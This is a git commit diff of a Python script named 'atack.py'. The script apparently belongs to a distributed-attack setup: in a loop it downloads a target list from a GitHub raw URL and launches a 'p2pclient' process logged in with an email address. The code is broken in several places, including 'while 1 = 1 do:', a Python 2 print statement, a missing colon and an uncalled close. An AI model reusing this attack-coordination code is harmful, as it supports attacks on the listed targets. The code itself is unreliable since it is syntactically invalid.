5d74957a1abc29d2fd38d8e6fe152f45efd99217
Patonia <for_i@i.ua>
2022-04-01 19:22:51 +0300

    Update atack.py

--- atack.py
+++ atack.py
@@ -1,13 +1,22 @@
 #!/usr/bin/env python3
 
-import socket,time,threading,sys,random,os,subprocess
+import socket,time,threading,sys,random,os,subprocess,requests
 from os import getcwd
 
-url = "https://raw.githubusercontent.com/Patonia/Patonia/main/target.txt"
-directory = getcwd()
-filename = directory + 'target.txt'
-r = requests.get(url)
-
-f = open(filename,'w')
-f.write(r.content)
-
+with open('test.txt', 'w') as f:
+    process = subprocess.Popen(['p2pclient', '--login', 'war030578@gmail.com'],
+    stdout=f,
+    stderr=f)
+   
+while 1 = 1 do:
+    timeout=time.time()+3600
+    url = "https://raw.githubusercontent.com/Patonia/Patonia/main/target.txt"
+    directory = getcwd()
+    filename = directory + 'target.txt'
+    r = requests.get(url)
+    f = open(filename,'w')
+    f.write(r.content)
+    f.close
+    with open(filename,'r') as f
+        for row in f:
+            print row
